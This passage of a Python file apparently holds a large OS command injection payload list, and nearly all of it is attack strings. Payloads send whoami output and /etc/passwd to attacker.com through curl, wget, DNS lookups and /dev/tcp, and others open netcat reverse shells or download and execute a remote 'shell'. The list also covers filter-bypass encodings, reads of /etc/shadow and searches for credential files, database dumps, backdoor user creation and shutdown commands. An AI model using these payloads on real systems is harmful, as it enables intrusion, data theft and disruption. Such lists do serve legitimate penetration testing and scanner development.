        ('; ping -c 1 $(whoami).attacker.com', 'Ping OOB'),
        ('; nc attacker.com 4444', 'Netcat Basic'),
        ('; nc -e /bin/sh attacker.com 4444', 'Netcat Reverse'),
        ('; telnet attacker.com 4444', 'Telnet OOB'),
        ('; curl -X POST -d "$(whoami)" http://attacker.com/', 'Curl POST Data'),
        ('; curl -F "file=@/etc/passwd" http://attacker.com/', 'Curl File Upload'),
        ('; wget --post-file=/etc/passwd http://attacker.com/', 'Wget POST File'),
        ('; curl http://attacker.com/`whoami`', 'Curl Backticks'),
        ('; wget http://attacker.com/`whoami`', 'Wget Backticks'),
        ('; nslookup `whoami`.attacker.com', 'NSLookup Backticks'),
        ('; dig `whoami`.attacker.com', 'Dig Backticks'),
        ('; host `whoami`.attacker.com', 'Host Backticks'),
        ('; python -c "import urllib; urllib.urlopen(\'http://attacker.com/\' + __import__(\'os\').popen(\'whoami\').read())"', 'Python OOB'),
        ('; python3 -c "import urllib.request; urllib.request.urlopen(\'http://attacker.com/\' + __import__(\'os\').popen(\'whoami\').read())"', 'Python3 OOB'),
        ('; perl -e "use LWP::UserAgent; my $ua = LWP::UserAgent->new; $ua->get(\'http://attacker.com/\' . `whoami`)"', 'Perl OOB'),
        ('; php -r "file_get_contents(\'http://attacker.com/\' . shell_exec(\'whoami\'));"', 'PHP OOB'),
        ('; ruby -e "require \'net/http\'; Net::HTTP.get(URI(\'http://attacker.com/\' + `whoami`))"', 'Ruby OOB'),
        ('; node -e "require(\'http\').get(\'http://attacker.com/\' + require(\'child_process\').execSync(\'whoami\'))"', 'Node OOB'),
        ('; curl --silent http://attacker.com/ --data "$(cat /etc/passwd)"', 'Curl Silent POST'),
        ('; wget --quiet --output-document=/dev/null --post-data="$(cat /etc/passwd)" http://attacker.com/', 'Wget Quiet POST'),
        ('; (curl http://attacker.com/$(whoami)) &', 'Background Curl'),
        ('; curl http://attacker.com/$(whoami) > /dev/null 2>&1', 'Curl Silent'),
        ('; exec 3<>/dev/tcp/attacker.com/4444; echo "$(whoami)" >&3; exec 3<&-', 'Bash TCP OOB'),
        ('; { echo "$(whoami)" > /dev/tcp/attacker.com/4444; } &', 'Bash TCP Background'),
        ('; printf "GET /$(whoami) HTTP/1.0\r\nHost: attacker.com\r\n\r\n" > /dev/tcp/attacker.com/80', 'Raw HTTP OOB'),
        
        # ==================== 201-250: FILTER BYPASS - IFS & WHITESPACE ====================
        (';id', 'No Space'),
        (';whoami', 'No Space Whoami'),
        (';ls', 'No Space LS'),
        (';cat/etc/passwd', 'No Space Cat'),
        (';cat${IFS}/etc/passwd', 'IFS Cat'),
        (';cat$IFS/etc/passwd', 'IFS Dollar Cat'),
        (';cat${IFS}/etc/passwd', 'IFS Braces Cat'),
        (';cat$IFS$9/etc/passwd', 'IFS Digit Cat'),
        (';cat${IFS}/etc/passwd${IFS}', 'IFS End Cat'),
        (';cat$u/etc$u/passwd', 'Variable Bypass'),
        (';cat$@/etc$@/passwd', 'At Variable'),
        (';cat$*/etc$*/passwd', 'Star Variable'),
        (';cat${IFS}/etc${IFS}/passwd', 'Double IFS'),
        (';cat${IFS}/etc/passwd', 'IFS Space'),
        (';{cat,/etc/passwd}', 'Brace Cat'),
        (';{cat,/etc/passwd}', 'Brace Command'),
        (';{ls,-la}', 'Brace LS'),
        (';a=id;$a', 'Variable Assign'),
        (';a=whoami;$a', 'Variable Whoami'),
        (';a=cat;$a /etc/passwd', 'Variable Cat'),
        (';IFS=,;`cat<<<cat,/etc/passwd`', 'IFS Redirect'),
        (';cat</etc/passwd', 'Redirect Input'),
        (';cat<>/etc/passwd', 'Redirect Read Write'),
        (';</etc/passwd cat', 'Redirect Reverse'),
        (';cat /etc/passwd<&1', 'Redirect FD'),
        (';cat /etc/passwd>&2', 'Redirect Stderr'),
        (';cat /etc/passwd 2>&1', 'Stderr to Stdout'),
        (';cat /etc/passwd | cat', 'Pipe Cat'),
        (';cat /etc/passwd;', 'Trailing Semi'),
        (';cat /etc/passwd#', 'Comment End'),
        (';cat /etc/passwd#comment', 'Comment'),
        (';cat /etc/passwd||', 'Empty Or'),
        (';cat /etc/passwd&&', 'Empty And'),
        (';cat /etc/passwd&', 'Background'),
        (';cat /etc/passwd&wait', 'Background Wait'),
        (';{cat,/etc/passwd} 2>/dev/null', 'Suppress Error'),
        (';cat /etc/passwd >/dev/null 2>&1', 'Suppress Output'),
        (';cat /etc/passwd | grep root', 'Pipe Grep'),
        (';cat /etc/passwd | head -1', 'Pipe Head'),
        (';cat /etc/passwd | tail -1', 'Pipe Tail'),
        (';cat /etc/passwd | wc -l', 'Pipe Word Count'),
        (';cat /etc/passwd | base64', 'Pipe Base64'),
        (';cat /etc/passwd | base64 -w 0', 'Pipe Base64 No Wrap'),
        (';base64 /etc/passwd | curl --data-binary @- http://attacker.com/', 'Base64 Curl'),
        (';cat /etc/passwd | xxd -p', 'Pipe XXD'),
        (';cat /etc/passwd | od -An -tx1', 'Pipe OD'),
        (';cat /etc/passwd | sed "s/^/PASSWD: /"', 'Pipe Sed'),
        (';cat /etc/passwd | awk \'{print}\'', 'Pipe Awk'),
        
        # ==================== 251-300: FILTER BYPASS - QUOTES & ENCODING ====================
        (";i'd", 'Single Quote Bypass'),
        (';i"d', 'Double Quote Bypass'),
        (";whoa'mi", 'Single Quote Whoami'),
        (';whoa"mi', 'Double Quote Whoami'),
        (";ca't /etc/passwd", 'Quote Cat'),
        (';ca"t /etc/passwd', 'Double Quote Cat'),
        (";c'a't /etc/passwd", 'Multiple Quotes'),
        (';c"a"t /etc/passwd', 'Multiple Double Quotes'),
        (";whoam\\i", 'Backslash Bypass'),
        (";c\\at /etc/passwd", 'Backslash Cat'),
        (";w\\h\\o\\a\\m\\i", 'Full Backslash'),
        (";c\\a\\t /etc/passwd", 'Full Backslash Cat'),
        (';whoam$@i', 'Variable Splice'),
        (';cat$@ /etc/passwd', 'Variable Splice Cat'),
        (';whoam$*i', 'Star Splice'),
        (';cat$* /etc/passwd', 'Star Splice Cat'),
        (';whoam$1i', 'Positional Splice'),
        (';whoam${#}i', 'Length Splice'),
        (';c${#}at /etc/passwd', 'Length Splice Cat'),
        (';whoam`echo i`', 'Command Sub Splice'),
        (';c`echo at` /etc/passwd', 'Command Sub Cat'),
        (';whoam$(echo i)', 'Dollar Sub Splice'),
        (';c$(echo at) /etc/passwd', 'Dollar Sub Cat'),
        ('%3bwhoami', 'URL Semi No Space'),
        ('%3bcat%20/etc/passwd', 'URL Semi Cat'),
        ('%7cwhoami', 'URL Pipe No Space'),
        ('%7ccat%20/etc/passwd', 'URL Pipe Cat'),
        ('%26whoami', 'URL Amp'),
        ('%26%26whoami', 'URL Double Amp'),
        ('%0awhoami', 'URL Newline No Space'),
        ('%0acat%20/etc/passwd', 'URL Newline Cat'),
        ('%0d%0awhoami', 'URL CRLF No Space'),
        ('%0d%0acat%20/etc/passwd', 'URL CRLF Cat'),
        (';wh%6fami', 'Hex Substitution'),
        (';c%61t /etc/passwd', 'Hex Cat'),
        (';w\x68oami', 'Hex Escape'),
        (';c\x61t /etc/passwd', 'Hex Escape Cat'),
        (';wh\u006fami', 'Unicode Sub'),
        (';c\u0061t /etc/passwd', 'Unicode Cat'),
        (';echo -e "whoami" | sh', 'Echo Pipe'),
        (';echo -e "cat /etc/passwd" | sh', 'Echo Pipe Cat'),
        (';printf "whoami" | sh', 'Printf Pipe'),
        (';printf "cat /etc/passwd" | sh', 'Printf Pipe Cat'),
        (';python -c "print(\'whoami\')" | sh', 'Python Print Pipe'),
        (';python3 -c "print(\'cat /etc/passwd\')" | sh', 'Python3 Print Pipe'),
        (';perl -e \'print "whoami"\' | sh', 'Perl Print Pipe'),
        (';php -r \'echo "whoami";\' | sh', 'PHP Echo Pipe'),
        
        # ==================== 301-350: FILTER BYPASS - GLOB & PATTERN ====================
        (';cat /etc/*', 'Glob Basic'),
        (';cat /etc/p*', 'Glob Pattern'),
        (';cat /etc/pa*', 'Glob Partial'),
        (';cat /etc/pass?d', 'Glob Question'),
        (';cat /etc/pass[wd]', 'Glob Class'),
        (';cat /etc/pass[a-z]', 'Glob Range'),
        (';cat /etc/[p]*', 'Glob Bracket'),
        (';cat /etc/{passwd,shadow}', 'Glob Braces'),
        (';cat /etc/{p*,s*}', 'Glob Braces Pattern'),
        (';cat /???/passwd', 'Glob Directory'),
        (';cat /???/??ss??', 'Glob Obscured'),
        (';cat /e??/p?????', 'Glob Fully'),
        (';cat /e*/p*', 'Glob Star'),
        (';cat /e**/p**', 'Glob Double Star'),
        (';cat ./././etc/passwd', 'Dot Glob'),
        (';cat ./../etc/passwd', 'Relative Glob'),
        (';cat /etc/./passwd', 'Current Dir Glob'),
        (';cat /etc/../etc/passwd', 'Parent Dir Glob'),
        (';cat /etc/....//passwd', 'Double Dot Glob'),
        (';cat /etc/././passwd', 'Multiple Dot Glob'),
        (';ls /bin/?sh', 'Shell Glob'),
        (';ls /bin/*sh', 'All Shells Glob'),
        (';ls /usr/bin/*', 'Bin Glob'),
        (';ls /usr/local/bin/*', 'Local Bin Glob'),
        (';find / -name "*.php" 2>/dev/null', 'Find PHP'),
        (';find / -name "passwd" 2>/dev/null', 'Find Passwd'),
        (';find / -type f -name "*.conf" 2>/dev/null', 'Find Conf'),
        (';find / -perm -4000 2>/dev/null', 'Find SUID'),
        (';find / -writable -type f 2>/dev/null', 'Find Writable'),
        (';find / -user root -perm -4000 2>/dev/null', 'Find Root SUID'),
        (';cat /proc/*/cmdline', 'Proc Glob'),
        (';cat /proc/self/cmdline', 'Proc Self'),
        (';cat /proc/self/environ', 'Proc Environ'),
        (';cat /proc/self/fd/*', 'Proc FD'),
        (';cat /proc/[0-9]*/cmdline', 'Proc PID Glob'),
        (';cat /proc/sys/kernel/hostname', 'Kernel Hostname'),
        (';cat /proc/sys/kernel/ostype', 'Kernel OS'),
        (';cat /proc/version', 'Kernel Version'),
        (';cat /proc/cpuinfo', 'CPU Info'),
        (';cat /proc/meminfo', 'Memory Info'),
        (';cat /proc/mounts', 'Mounts'),
        (';cat /proc/partitions', 'Partitions'),
        (';cat /proc/net/tcp', 'TCP Connections'),
        (';cat /proc/net/udp', 'UDP Connections'),
        (';cat /proc/net/dev', 'Network Devices'),
        (';cat /proc/net/route', 'Routing Table'),
        (';cat /proc/net/arp', 'ARP Table'),
        (';cat /proc/loadavg', 'Load Average'),
        (';cat /proc/uptime', 'Uptime'),
        (';cat /proc/stat', 'System Stats'),
        
        # ==================== 351-400: ENVIRONMENT VARIABLES & PATHS ====================
        (';$PATH', 'PATH Variable'),
        (';$SHELL', 'SHELL Variable'),
        (';$HOME', 'HOME Variable'),
        (';$USER', 'USER Variable'),
        (';$LOGNAME', 'LOGNAME Variable'),
        (';$PWD', 'PWD Variable'),
        (';$OLDPWD', 'OLDPWD Variable'),
        (';$LANG', 'LANG Variable'),
        (';$TERM', 'TERM Variable'),
        (';$DISPLAY', 'DISPLAY Variable'),
        (';${PATH}', 'Braced PATH'),
        (';${SHELL}', 'Braced SHELL'),
        (';${HOME}', 'Braced HOME'),
        (';${USER}', 'Braced USER'),
        (';${PWD}', 'Braced PWD'),
        (';${OLDPWD}', 'Braced OLDPWD'),
        (';echo $PATH', 'Echo PATH'),
        (';echo $SHELL', 'Echo SHELL'),
        (';echo $HOME', 'Echo HOME'),
        (';echo $USER', 'Echo USER'),
        (';echo $PWD', 'Echo PWD'),
        (';echo $OLDPWD', 'Echo OLDPWD'),
        (';printenv', 'Print Env'),
        (';printenv PATH', 'Print PATH'),
        (';env', 'Env Basic'),
        (';env | grep -i "pass"', 'Env Grep'),
        (';set', 'Set Variables'),
        (';declare', 'Declare Variables'),
        (';export', 'Export Variables'),
        (';echo ${#PATH}', 'Variable Length'),
        (';echo ${PATH:0:10}', 'Variable Substring'),
        (';echo ${PATH#*/}', 'Variable Trim'),
        (';echo ${PATH##*/}', 'Variable Trim Max'),
        (';echo ${PATH%/*}', 'Variable Trim End'),
        (';echo ${PATH%%/*}', 'Variable Trim End Max'),
        (';echo ${PATH/:/ }', 'Variable Replace'),
        (';echo ${PATH//:/ }', 'Variable Replace All'),
        (';cd /etc && cat passwd', 'CD Cat'),
        (';cd /etc; cat passwd', 'Semi CD Cat'),
        (';cd /etc | cat passwd', 'Pipe CD Cat'),
        (';cd /etc || cat passwd', 'Or CD Cat'),
        (';cd /etc & cat passwd', 'Amp CD Cat'),
        (';cd /etc && cat passwd || echo fail', 'CD And Or'),
        (';cd /tmp; wget http://attacker.com/shell; chmod +x shell; ./shell', 'CD Wget Execute'),
        (';cd /tmp; curl -O http://attacker.com/shell; bash shell', 'CD Curl Execute'),
        (';cd /tmp; python -c "import urllib; urllib.urlretrieve(\'http://attacker.com/shell\', \'shell\'); import os; os.system(\'chmod +x shell; ./shell\')"', 'Python Download Execute'),
        (';cd /tmp; perl -e \'use LWP::Simple; getstore("http://attacker.com/shell", "shell"); system("chmod +x shell; ./shell")\'', 'Perl Download Execute'),
        (';cd /tmp; php -r \'file_put_contents("shell", file_get_contents("http://attacker.com/shell")); exec("chmod +x shell; ./shell")\'', 'PHP Download Execute'),
        
        # ==================== 401-450: REDIRECTION & FILE OPERATIONS ====================
        (';cat < /etc/passwd', 'Input Redirect'),
        (';cat <> /etc/passwd', 'Read Write'),
        (';cat /etc/passwd > /tmp/out', 'Output Redirect'),
        (';cat /etc/passwd >> /tmp/out', 'Append Redirect'),
        (';cat /etc/passwd 2> /tmp/err', 'Error Redirect'),
        (';cat /etc/passwd &> /tmp/out', 'All Output'),
        (';cat /etc/passwd >&2', 'Redirect to Stderr'),
        (';cat /etc/passwd 2>&1', 'Stderr to Stdout'),
        (';cat /etc/passwd | tee /tmp/out', 'Tee Output'),
        (';cat /etc/passwd | tee -a /tmp/out', 'Tee Append'),
        (';cp /etc/passwd /tmp/passwd', 'Copy File'),
        (';mv /etc/passwd /tmp/passwd', 'Move File'),
        (';rm /tmp/passwd', 'Remove File'),
        (';touch /tmp/test', 'Touch File'),
        (';mkdir /tmp/testdir', 'Make Directory'),
        (';rmdir /tmp/testdir', 'Remove Directory'),
        (';ln -s /etc/passwd /tmp/link', 'Symbolic Link'),
        (';chmod 777 /tmp/test', 'Change Permissions'),
        (';chown nobody /tmp/test', 'Change Owner'),
        (';chgrp nogroup /tmp/test', 'Change Group'),
        (';tar -czf /tmp/backup.tar.gz /etc', 'Tar Archive'),
        (';tar -xzf /tmp/backup.tar.gz -C /tmp', 'Tar Extract'),
        (';zip -r /tmp/backup.zip /etc', 'Zip Archive'),
        (';unzip /tmp/backup.zip -d /tmp', 'Unzip Extract'),
        (';gzip /etc/passwd', 'Gzip File'),
        (';gunzip /etc/passwd.gz', 'Gunzip File'),
        (';bzip2 /etc/passwd', 'Bzip2 File'),
        (';bunzip2 /etc/passwd.bz2', 'Bunzip2 File'),
        (';base64 /etc/passwd > /tmp/passwd.b64', 'Base64 Encode'),
        (';base64 -d /tmp/passwd.b64', 'Base64 Decode'),
        (';xxd /etc/passwd > /tmp/passwd.hex', 'XXD Encode'),
        (';xxd -r /tmp/passwd.hex', 'XXD Decode'),
        (';md5sum /etc/passwd', 'MD5 Sum'),
        (';sha1sum /etc/passwd', 'SHA1 Sum'),
        (';sha256sum /etc/passwd', 'SHA256 Sum'),
        (';wc -l /etc/passwd', 'Line Count'),
        (';wc -c /etc/passwd', 'Byte Count'),
        (';wc -w /etc/passwd', 'Word Count'),
        (';head -10 /etc/passwd', 'First 10 Lines'),
        (';tail -10 /etc/passwd', 'Last 10 Lines'),
        (';sort /etc/passwd', 'Sort File'),
        (';uniq /etc/passwd', 'Unique Lines'),
        (';grep root /etc/passwd', 'Grep Root'),
        (';grep -v root /etc/passwd', 'Grep Invert'),
        (';grep -i admin /etc/passwd', 'Grep Case Insensitive'),
        (';awk -F: \'{print $1}\' /etc/passwd', 'Awk Usernames'),
        (';cut -d: -f1 /etc/passwd', 'Cut Usernames'),
        (';sed \'s/root/admin/g\' /etc/passwd', 'Sed Replace'),
        (';tr \':\' \' \' < /etc/passwd', 'Tr Translate'),
        (';diff /etc/passwd /etc/shadow', 'Diff Files'),
        
        # ==================== 451-500: NETWORK COMMANDS ====================
        (';ifconfig', 'Ifconfig'),
        (';ip addr', 'IP Addr'),
        (';ip a', 'IP Short'),
        (';ip route', 'IP Route'),
        (';ip link', 'IP Link'),
        (';route -n', 'Route'),
        (';netstat -tulpn', 'Netstat Services'),
        (';netstat -an', 'Netstat All'),
        (';netstat -r', 'Netstat Route'),
        (';ss -tulpn', 'SS Services'),
        (';ss -an', 'SS All'),
        (';ss -r', 'SS Route'),
        (';arp -a', 'ARP Table'),
        (';nmap -sS 127.0.0.1', 'Nmap Scan'),
        (';nmap -sV 127.0.0.1', 'Nmap Version'),
        (';nmap -p- 127.0.0.1', 'Nmap All Ports'),
        (';nc -zv 127.0.0.1 1-1000', 'Netcat Port Scan'),
        (';nc -l -p 4444 &', 'Netcat Listen'),
        (';nc -e /bin/sh 127.0.0.1 4444 &', 'Netcat Shell'),
        (';telnet 127.0.0.1 23', 'Telnet Basic'),
        (';ssh root@127.0.0.1', 'SSH Basic'),
        (';ssh -o StrictHostKeyChecking=no root@127.0.0.1', 'SSH No Check'),
        (';ftp 127.0.0.1', 'FTP Basic'),
        (';tftp 127.0.0.1', 'TFTP Basic'),
        (';wget http://127.0.0.1/index.html', 'Wget Basic'),
        (';wget -r http://127.0.0.1/', 'Wget Recursive'),
        (';wget -m http://127.0.0.1/', 'Wget Mirror'),
        (';curl http://127.0.0.1/', 'Curl Basic'),
        (';curl -I http://127.0.0.1/', 'Curl Headers'),
        (';curl -v http://127.0.0.1/', 'Curl Verbose'),
        (';curl -k https://127.0.0.1/', 'Curl Insecure'),
        (';curl -X POST http://127.0.0.1/ -d "data=test"', 'Curl POST'),
        (';curl -H "X-Custom: test" http://127.0.0.1/', 'Curl Header'),
        (';curl --user-agent "Mozilla/5.0" http://127.0.0.1/', 'Curl User Agent'),
        (';curl --cookie "session=test" http://127.0.0.1/', 'Curl Cookie'),
        (';curl --referer "http://google.com" http://127.0.0.1/', 'Curl Referer'),
        (';curl --proxy http://proxy:8080 http://127.0.0.1/', 'Curl Proxy'),
        (';curl --limit-rate 1k http://127.0.0.1/', 'Curl Limit'),
        (';curl --max-time 10 http://127.0.0.1/', 'Curl Timeout'),
        (';curl --retry 3 http://127.0.0.1/', 'Curl Retry'),
        (';wget --user-agent="Mozilla/5.0" http://127.0.0.1/', 'Wget User Agent'),
        (';wget --header="X-Custom: test" http://127.0.0.1/', 'Wget Header'),
        (';wget --referer="http://google.com" http://127.0.0.1/', 'Wget Referer'),
        (';wget --timeout=10 http://127.0.0.1/', 'Wget Timeout'),
        (';wget --tries=3 http://127.0.0.1/', 'Wget Tries'),
        (';wget --limit-rate=1k http://127.0.0.1/', 'Wget Limit'),
        (';wget --mirror --convert-links http://127.0.0.1/', 'Wget Mirror'),
        (';lynx http://127.0.0.1/', 'Lynx Browser'),
        (';links http://127.0.0.1/', 'Links Browser'),
        (';elinks http://127.0.0.1/', 'ELinks Browser'),
        
        # ==================== 501-550: SYSTEM INFORMATION ====================
        (';whoami', 'Whoami Basic'),
        (';who am i', 'Who Am I'),
        (';id', 'ID Basic'),
        (';id -a', 'ID All'),
        (';id -u', 'ID User'),
        (';id -g', 'ID Group'),
        (';id -G', 'ID Groups'),
        (';id -un', 'ID Username'),
        (';hostname', 'Hostname Basic'),
        (';hostname -f', 'Hostname FQDN'),
        (';hostname -i', 'Hostname IP'),
        (';uname -a', 'Uname All'),
        (';uname -s', 'Uname Kernel'),
        (';uname -n', 'Uname Hostname'),
        (';uname -r', 'Uname Release'),
        (';uname -v', 'Uname Version'),
        (';uname -m', 'Uname Machine'),
        (';uname -o', 'Uname OS'),
        (';cat /etc/os-release', 'OS Release'),
        (';cat /etc/issue', 'Issue'),
        (';cat /etc/issue.net', 'Issue Net'),
        (';cat /etc/lsb-release', 'LSB Release'),
        (';cat /etc/debian_version', 'Debian Version'),
        (';cat /etc/redhat-release', 'RedHat Release'),
        (';cat /etc/centos-release', 'CentOS Release'),
        (';cat /etc/alpine-release', 'Alpine Release'),
        (';cat /etc/arch-release', 'Arch Release'),
        (';lsb_release -a', 'LSB Release'),
        (';getconf LONG_BIT', 'Getconf Bits'),
        (';arch', 'Architecture'),
        (';file /bin/ls', 'File Type'),
        (';which ls', 'Which Command'),
        (';whereis ls', 'Whereis Command'),
        (';type ls', 'Type Command'),
        (';hash -r', 'Hash Reset'),
        (';alias', 'Aliases'),
        (';ulimit -a', 'Ulimits'),
        (';sysctl -a', 'Sysctl All'),
        (';sysctl kernel.version', 'Sysctl Version'),
        (';dmidecode -s system-manufacturer', 'DMI Manufacturer'),
        (';dmidecode -s system-product-name', 'DMI Product'),
        (';dmidecode -s bios-version', 'BIOS Version'),
        (';lscpu', 'CPU Info'),
        (';lshw -short', 'Hardware Short'),
        (';lspci', 'PCI Devices'),
        (';lsusb', 'USB Devices'),
        (';lsblk', 'Block Devices'),
        (';fdisk -l', 'Disk Partitions'),
        (';df -h', 'Disk Free'),
        (';du -sh /*', 'Disk Usage Root'),
        (';free -m', 'Memory Free'),
        (';vmstat 1 5', 'VM Stats'),
        
        # ==================== 551-600: PROCESS MANAGEMENT ====================
        (';ps aux', 'PS All'),
        (';ps -ef', 'PS EF'),
        (';ps -eLf', 'PS Threads'),
        (';ps -u root', 'PS User Root'),
        (';ps -U www-data', 'PS User WWW'),
        (';top -b -n 1', 'Top Batch'),
        (';htop', 'Htop'),
        (';pstree -a', 'Process Tree'),
        (';pgrep -l ssh', 'PGrep SSH'),
        (';pgrep -u root', 'PGrep Root'),
        (';pkill -f test', 'PKill'),
        (';kill -9 1234', 'Kill PID'),
        (';killall -9 apache2', 'Killall'),
        (';kill -TERM -1', 'Kill All'),
        (';nice -n 19 command', 'Nice Priority'),
        (';renice 19 -p 1234', 'Renice'),
        (';nohup command &', 'Nohup Background'),
        (';disown', 'Disown'),
        (';jobs', 'Jobs'),
        (';fg', 'Foreground'),
        (';bg', 'Background'),
        (';wait', 'Wait'),
        (';sleep 30 &', 'Background Sleep'),
        (';while true; do echo "running"; sleep 10; done &', 'Background Loop'),
        (';crontab -l', 'Crontab List'),
        (';crontab -r', 'Crontab Remove'),
        (';crontab -e', 'Crontab Edit'),
        (';systemctl list-units', 'Systemctl Units'),
        (';systemctl status', 'Systemctl Status'),
        (';systemctl list-unit-files', 'Systemctl Files'),
        (';service --status-all', 'Service Status'),
        (';service apache2 status', 'Service Apache'),
        (';service apache2 start', 'Service Start'),
        (';service apache2 stop', 'Service Stop'),
        (';service apache2 restart', 'Service Restart'),
        (';systemctl start apache2', 'Systemctl Start'),
        (';systemctl stop apache2', 'Systemctl Stop'),
        (';systemctl restart apache2', 'Systemctl Restart'),
        (';systemctl enable apache2', 'Systemctl Enable'),
        (';systemctl disable apache2', 'Systemctl Disable'),
        (';init 0', 'Init Shutdown'),
        (';init 6', 'Init Reboot'),
        (';shutdown -h now', 'Shutdown'),
        (';reboot', 'Reboot'),
        (';halt', 'Halt'),
        (';poweroff', 'Poweroff'),
        (';logout', 'Logout'),
        (';exit', 'Exit'),
        (';Ctrl+C', 'Interrupt'),
        (';Ctrl+Z', 'Suspend'),
        
        # ==================== 601-650: USER MANAGEMENT ====================
        (';who', 'Who Logged'),
        (';w', 'W Command'),
        (';last', 'Last Logins'),
        (';lastlog', 'Last Log All'),
        (';lastb', 'Bad Logins'),
        (';users', 'Users'),
        (';groups', 'Groups'),
        (';groups root', 'Groups Root'),
        (';id www-data', 'ID User'),
        (';finger', 'Finger'),
        (';finger root', 'Finger Root'),
        (';pinky', 'Pinky'),
        (';ac', 'Connection Time'),
        (';sa', 'SAR Data'),
        (';lastcomm', 'Last Commands'),
        (';useradd hacker', 'User Add'),
        (';userdel hacker', 'User Delete'),
        (';usermod -aG sudo hacker', 'User Mod'),
        (';passwd hacker', 'Passwd Change'),
        (';chpasswd', 'Chpasswd'),
        (';groupadd hackers', 'Group Add'),
        (';groupdel hackers', 'Group Delete'),
        (';groupmod -n newname oldname', 'Group Mod'),
        (';gpasswd -a user group', 'Gpasswd Add'),
        (';gpasswd -d user group', 'Gpasswd Remove'),
        (';su - hacker', 'Switch User'),
        (';sudo -l', 'Sudo List'),
        (';sudo -u hacker id', 'Sudo As User'),
        (';sudo id', 'Sudo ID'),
        (';sudo su -', 'Sudo Su'),
        (';visudo', 'Visudo'),
        (';cat /etc/sudoers', 'Sudoers File'),
        (';cat /etc/sudoers.d/*', 'Sudoers D'),
        (';cat /etc/passwd', 'Passwd File'),
        (';cat /etc/shadow', 'Shadow File'),
        (';cat /etc/group', 'Group File'),
        (';cat /etc/gshadow', 'GShadow File'),
        (';cat /etc/subuid', 'Subuid'),
        (';cat /etc/subgid', 'Subgid'),
        (';vipw', 'VIPW'),
        (';vigr', 'VIGR'),
        (';pwck', 'PWCK'),
        (';grpck', 'GRPCK'),
        (';newusers', 'Newusers'),
        (';chage -l root', 'Chage Root'),
        (';expiry', 'Expiry'),
        (';faillog -a', 'Fail Log'),
        (';lastlog -u root', 'Lastlog Root'),
        (';loginctl list-users', 'Loginctl Users'),
        (';loginctl list-sessions', 'Loginctl Sessions'),
        (';loginctl user-status', 'Loginctl Status'),
        
        # ==================== 651-700: FILE SYSTEM & DISK ====================
        (';ls -la', 'LS Long'),
        (';ls -laR', 'LS Recursive'),
        (';ls -la /', 'LS Root'),
        (';ls -la /etc', 'LS Etc'),
        (';ls -la /var', 'LS Var'),
        (';ls -la /tmp', 'LS Tmp'),
        (';ls -la /home', 'LS Home'),
        (';ls -la /root', 'LS Root Home'),
        (';ls -la /opt', 'LS Opt'),
        (';ls -la /usr', 'LS Usr'),
        (';ls -la /bin', 'LS Bin'),
        (';ls -la /sbin', 'LS Sbin'),
        (';ls -la /usr/local', 'LS Usr Local'),
        (';find / -type f -name "*.php" 2>/dev/null', 'Find PHP Files'),
        (';find / -type f -name "*.py" 2>/dev/null', 'Find Python Files'),
        (';find / -type f -name "*.js" 2>/dev/null', 'Find JS Files'),
        (';find / -type f -name "*.conf" 2>/dev/null', 'Find Configs'),
        (';find / -type f -name "*.log" 2>/dev/null', 'Find Logs'),
        (';find / -type d -name "*web*" 2>/dev/null', 'Find Web Dirs'),
        (';find / -type f -perm -4000 2>/dev/null', 'Find SUID'),
        (';find / -type f -perm -2000 2>/dev/null', 'Find SGID'),
        (';find / -type f -perm -o+w 2>/dev/null', 'Find World Writable'),
        (';find / -type d -perm -o+w 2>/dev/null', 'Find World Writable Dir'),
        (';find / -user root -type f 2>/dev/null', 'Find Root Files'),
        (';find / -size +10M -type f 2>/dev/null', 'Find Large Files'),
        (';find / -mtime -1 -type f 2>/dev/null', 'Find Recent Files'),
        (';find / -name "*password*" 2>/dev/null', 'Find Passwords'),
        (';find / -name "*credential*" 2>/dev/null', 'Find Credentials'),
        (';find / -name "*secret*" 2>/dev/null', 'Find Secrets'),
        (';find / -name "*key*" 2>/dev/null', 'Find Keys'),
        (';find / -name "*token*" 2>/dev/null', 'Find Tokens'),
        (';find / -name "*.pem" 2>/dev/null', 'Find PEM Certs'),
        (';find / -name "*.key" 2>/dev/null', 'Find Key Files'),
        (';find / -name "id_rsa" 2>/dev/null', 'Find SSH Keys'),
        (';find / -name "authorized_keys" 2>/dev/null', 'Find SSH Auth Keys'),
        (';find / -name ".bash_history" 2>/dev/null', 'Find Bash History'),
        (';find / -name ".mysql_history" 2>/dev/null', 'Find MySQL History'),
        (';find / -name ".psql_history" 2>/dev/null', 'Find PSQL History'),
        (';find / -name "wp-config.php" 2>/dev/null', 'Find WP Config'),
        (';find / -name ".env" 2>/dev/null', 'Find Env Files'),
        (';find / -name "config.php" 2>/dev/null', 'Find Config PHP'),
        (';find / -name "settings.py" 2>/dev/null', 'Find Settings Python'),
        (';find / -name "database.yml" 2>/dev/null', 'Find Database YAML'),
        (';find / -name "Dockerfile" 2>/dev/null', 'Find Dockerfile'),
        (';find / -name "docker-compose.yml" 2>/dev/null', 'Find Docker Compose'),
        (';find / -name "Makefile" 2>/dev/null', 'Find Makefile'),
        (';find / -name "Jenkinsfile" 2>/dev/null', 'Find Jenkinsfile'),
        (';find / -name ".git/config" 2>/dev/null', 'Find Git Config'),
        (';find / -name ".svn/entries" 2>/dev/null', 'Find SVN Entries'),
        (';find / -name ".hg/hgrc" 2>/dev/null', 'Find HG Config'),
        
        # ==================== 701-750: DATABASE COMMANDS ====================
        (';mysql --version', 'MySQL Version'),
        (';mysql -u root -e "SELECT VERSION()"', 'MySQL Query'),
        (';mysql -u root -e "SHOW DATABASES"', 'MySQL Show DBs'),
        (';mysql -u root -e "USE mysql; SELECT user, password FROM user"', 'MySQL Users'),
        (';mysql -u root -e "SELECT * FROM information_schema.tables"', 'MySQL Info Schema'),
        (';mysqldump -u root --all-databases', 'MySQL Dump'),
        (';mysqladmin -u root version', 'MySQLAdmin Version'),
        (';mysqladmin -u root status', 'MySQLAdmin Status'),
        (';mysqlcheck -u root --all-databases', 'MySQLCheck'),
        (';mysqlshow -u root', 'MySQLShow'),
        (';psql --version', 'PostgreSQL Version'),
        (';psql -U postgres -c "SELECT version()"', 'PostgreSQL Query'),
        (';psql -U postgres -c "\\l"', 'PostgreSQL List DBs'),
        (';psql -U postgres -c "SELECT usename, passwd FROM pg_shadow"', 'PostgreSQL Users'),
        (';pg_dumpall -U postgres', 'PostgreSQL Dump'),
        (';sqlite3 --version', 'SQLite Version'),
        (';sqlite3 /tmp/test.db "SELECT * FROM sqlite_master"', 'SQLite Query'),
        (';sqlite3 /var/www/html/data.db ".tables"', 'SQLite Tables'),
        (';sqlite3 /var/www/html/data.db ".schema"', 'SQLite Schema'),
